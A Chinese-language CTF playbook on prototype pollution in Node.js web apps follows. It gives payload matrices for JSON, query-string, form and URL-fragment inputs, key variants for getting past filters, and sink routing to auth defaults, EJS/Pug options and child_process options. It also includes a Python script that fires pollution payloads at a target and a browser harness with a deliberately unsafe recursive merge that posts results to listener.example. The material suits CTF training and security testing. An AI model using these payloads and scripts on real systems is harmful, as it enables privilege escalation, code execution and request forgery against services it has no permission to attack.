---
id: "ctf-website/03-injection/prototype-pollution"
title: "Prototype Pollution (原型链污染)"
title_en: "Prototype Pollution"
summary: >
  原型链污染实战不是只打 `__proto__`，而是沿 source、parser、merge、polluted key、sink、业务 oracle 串起来验证。本篇给出 JSON/QS/Form/Fragment 输入矩阵、污染 key 变体、EJS/Pug/Handlebars/child_process/鉴权默认值等 sink 路由、服务端与客户端探测脚本、成功/失败样本和 Evidence 模板。
summary_en: >
  Prototype pollution exploitation should route source, parser, merge behavior, polluted keys, sinks, and business oracles together. This playbook covers JSON/QS/Form/Fragment matrices, key variants, sink routing for templates/process options/auth defaults, server/client probes, success/failure samples, and evidence templates.
board: "ctf-website"
category: "03-injection"
signals: ["prototype pollution", "原型链污染", "__proto__", "constructor.prototype", "EJS", "Pug", "child_process", "Node.js", "qs"]
mcp_tools: ["http_probe", "kb_router", "jshook"]
keywords: ["prototype pollution", "原型链污染", "__proto__", "constructor.prototype", "EJS", "Pug", "Node.js", "qs", "模板引擎"]
difficulty: "advanced"
tags: ["injection", "prototype-pollution", "nodejs", "template", "ctf"]
language: "zh-CN"
last_updated: "2026-07-04"
related_articles: ["ctf-website/07-client/postmessage", "ctf-website/07-client/js-runtime", "ctf-website/02-auth/jwt/06-claim-missing"]
---

# Prototype Pollution (原型链污染)

原型链污染的核心判断是：不可信键名是否进入递归 merge / path setter / parser，并最终影响某个 sink。单独证明 `{}.polluted === "yes"` 还不够，必须继续证明它改变了鉴权、模板、请求、日志、子进程、渲染或前端路由的行为。

## 输入信号

| 信号 | 立即动作 | 命中样本 | 失败样本 |
|---|---|---|---|
| JSON body 被 deep merge | 发送 `__proto__` 与 `constructor.prototype` 双路线 | 后续空对象继承 marker，或业务响应变化 | parser 保留 key 但 merge 跳过危险段 |
| `qs`/嵌套 query 参数 | 测 `a[b]=c`、数组、点号解析 | `__proto__[x]=y` 进入对象 | query parser 关闭嵌套 |
| 配置对象默认值 | 污染 `isAdmin/role/debug/template` | 未显式字段的对象获得默认权限或路径 | 业务只读 own property |
| 模板引擎 | 路由到 EJS/Pug/Handlebars options | 渲染错误、输出函数名、helper 行为变化 | options 用 null-prototype 对象 |
| 客户端 hash/query 合并 | fragment PP + DOM sink | 前端路由/按钮/API base 改变 | 解析后做 schema 白名单 |
| postMessage/JSON.parse | 发送对象 payload | handler merge 后状态变化 | structured clone 后被 validator 拒绝 |

## 工作流

```text
定位 parser 与 merge/source
  → 用 marker key 建污染 baseline
  → 测 __proto__ / constructor.prototype / dotted path 变体
  → 选择业务 sink: auth/template/process/log/client route
  → 用同一 oracle 证明状态、权限、输出或 flag 差异
  → 记录成功样本和失败样本
```

## 0. Source 与 sink 判定矩阵

| Source | Payload 形态 | Sink 候选 | 观察点 |
|---|---|---|---|
| JSON body | `{"__proto__":{"pp":"x"}}` | API 默认 role/config | `/api/me`、错误字段、权限菜单 |
| Query string | `?__proto__[pp]=x` | Express/qs 中间件 | 后续请求是否继承 marker |
| Form body | `__proto__[pp]=x` | body-parser + merge | 响应 hash、状态字段 |
| postMessage | `{"constructor":{"prototype":...}}` | 前端 store/router | DOM、API base、token |
| YAML/TOML config | `__proto__:` | 任务 runner/config | job 参数、渲染路径 |
| package option | `constructor.prototype` | template/log/process options | 渲染错误、helper/format 行为 |

## 1. 服务端 PP oracle

```python
#!/usr/bin/env python3
import argparse
import copy
import hashlib
import json
import requests

PAYLOADS = [
    ("json_proto_marker", "json", {"__proto__": {"pp_marker": "pp_yes"}}),
    ("json_ctor_marker", "json", {"constructor": {"prototype": {"pp_marker": "pp_yes"}}}),
    ("json_role", "json", {"__proto__": {"isAdmin": True, "role": "admin"}}),
    ("qs_proto_marker", "qs", "__proto__[pp_marker]=pp_yes"),
    ("qs_ctor_marker", "qs", "constructor[prototype][pp_marker]=pp_yes"),
    ("form_proto_marker", "form", {"__proto__[pp_marker]": "pp_yes"}),
    ("form_ctor_marker", "form", {"constructor[prototype][pp_marker]": "pp_yes"}),
]

def digest(text):
    return hashlib.sha256(text.encode("utf-8", errors="ignore")).hexdigest()[:16]

def send(base, path, case, kind, payload, cookie=""):
    sess = requests.Session()
    if cookie:
        sess.headers["Cookie"] = cookie
    url = base.rstrip("/") + path
    if kind == "json":
        r = sess.post(url, json=payload, timeout=10)
    elif kind == "form":
        r = sess.post(url, data=payload, timeout=10)
    else:
        r = sess.get(url + ("&" if "?" in url else "?") + payload, timeout=10)
    return {"case": case, "status": r.status_code, "hash": digest(r.text), "sample": r.text[:180]}

def oracle(base, path, cookie=""):
    headers = {"Cookie": cookie} if cookie else {}
    r = requests.get(base.rstrip("/") + path, headers=headers, timeout=10)
    return {"status": r.status_code, "hash": digest(r.text), "sample": r.text[:220]}

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", required=True)
    ap.add_argument("--source-path", required=True)
    ap.add_argument("--oracle-path", required=True)
    ap.add_argument("--cookie", default="")
    args = ap.parse_args()
    print(json.dumps({"baseline": oracle(args.base, args.oracle_path, args.cookie)}, ensure_ascii=False))
    for case, kind, payload in PAYLOADS:
        sent = send(args.base, args.source_path, case, kind, payload, args.cookie)
        after = oracle(args.base, args.oracle_path, args.cookie)
        print(json.dumps({"send": sent, "after": after}, ensure_ascii=False))

if __name__ == "__main__":
    main()
```

成功样本：发送 marker 后，后续独立 oracle 的身份、权限、配置、错误文本或响应 hash 稳定变化。失败样本：source 接收 payload 但 oracle 不变，说明没有可用 sink 或污染被隔离在局部对象。

## 2. key 变体与 parser 差分

| 变体 | 用途 |
|---|---|
| `__proto__` | 常规对象原型路线 |
| `constructor.prototype` | `__proto__` 被过滤时的替代路线 |
| `prototype` | class/function option 污染 |
| `a.__proto__.x` | dot notation path setter |
| `a[__proto__][x]` | bracket parser |
| `__%70roto__` | 解码顺序差分 |
| `constructor[prototype][x]` | qs/body-parser 路线 |

## 3. sink 路由

| Sink | 污染 key | 命中样本 | 失败样本 |
|---|---|---|---|
| 鉴权默认值 | `isAdmin`, `role`, `permissions` | 新对象默认进入 admin 分支 | 只用 `hasOwnProperty` |
| 模板引擎 options | `outputFunctionName`, `compileDebug`, `client` | 渲染输出/错误栈变化 | options 固定白名单 |
| 子进程 options | `shell`, `env`, `argv0` | job/convert/export 行为变化 | 显式 options 覆盖原型 |
| 日志/格式化 | `format`, `stream`, `level` | 日志输出结构变化 | logger 使用 own config |
| HTTP client | `baseURL`, `headers`, `method` | SSRF/请求头/路径改变 | URL 重新构造 |
| 前端 store | `apiBase`, `isAdmin`, `redirect` | DOM/API/路由变化 | schema 校验拒绝 |

## 4. 客户端 PP harness

```html
<!doctype html>
<meta charset="utf-8">
<script>
function parseHash() {
  const out = {};
  for (const part of location.hash.slice(1).split("&")) {
    const [k, v] = part.split("=");
    if (!k) continue;
    const m = k.match(/^(.+)\[(.+)\]$/);
    if (m) {
      out[m[1]] = out[m[1]] || {};
      out[m[1]][m[2]] = decodeURIComponent(v || "");
    } else {
      out[k] = decodeURIComponent(v || "");
    }
  }
  return out;
}
function merge(a, b) {
  for (const k in b) {
    if (b[k] && typeof b[k] === "object") {
      a[k] = a[k] || {};
      merge(a[k], b[k]);
    } else {
      a[k] = b[k];
    }
  }
  return a;
}
const before = {}.pp_marker;
merge({}, parseHash());
fetch("https://listener.example/pp", {
  method: "POST",
  mode: "no-cors",
  body: JSON.stringify({before, after: {}.pp_marker, admin: {}.isAdmin, href: location.href})
});
</script>
```

测试 URL：

```text
https://target.example/page#constructor[prototype]=x&__proto__[pp_marker]=pp_yes&__proto__[isAdmin]=true
```

## 攻击链

```text
parser/source 命中
  → marker 证明原型污染
  → 业务 sink 路由
  → auth/template/process/client route oracle
  → 权限、渲染、请求、flag 差异
```

## Evidence

| 项 | 记录内容 |
|---|---|
| Source | URL、method、content-type、parser、payload 形态 |
| 污染证明 | marker key、前后 oracle、响应 hash、错误文本 |
| Sink | key 名、触发路径、业务动作、状态变化 |
| 成功样本 | 权限/渲染/请求/flag 差异可重复出现 |
| 失败样本 | parser 不解析嵌套、merge 跳过 key、sink 只读 own property |
| 下一跳 | 前端转 `07-client/js-runtime/postmessage`；模板转 SSTI；token 转 JWT |

## MCP 工具映射

| 步骤 | MCP 工具 | 说明 |
|---|---|---|
| HTTP source 探测 | `http_probe` | 发送 JSON/QS/Form PP 变体 |
| 浏览器 harness | `jshook` | 观察前端 merge/store/router 行为 |
| 知识路由 | `kb_router` | 按 prototype pollution、qs、模板 sink 信号搜索 |
